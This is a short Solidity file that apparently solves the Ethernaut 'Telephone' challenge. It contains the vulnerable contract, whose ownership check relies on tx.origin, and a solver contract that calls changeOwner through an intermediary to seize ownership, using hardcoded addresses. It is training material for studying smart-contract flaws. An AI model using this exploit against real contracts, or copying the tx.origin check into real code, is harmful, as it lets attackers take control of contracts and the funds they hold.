// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract telephoneSolver {

    function solve() external {
        address contractAddr = address(0xd9145CCE52D386f254917e481eB44e9943F39138);
        contractAddr.call(abi.encodeWithSignature("changeOwner(address)", address(0x798349E06c67272465123B91bd88C5d19b8c7878)));
    }
}

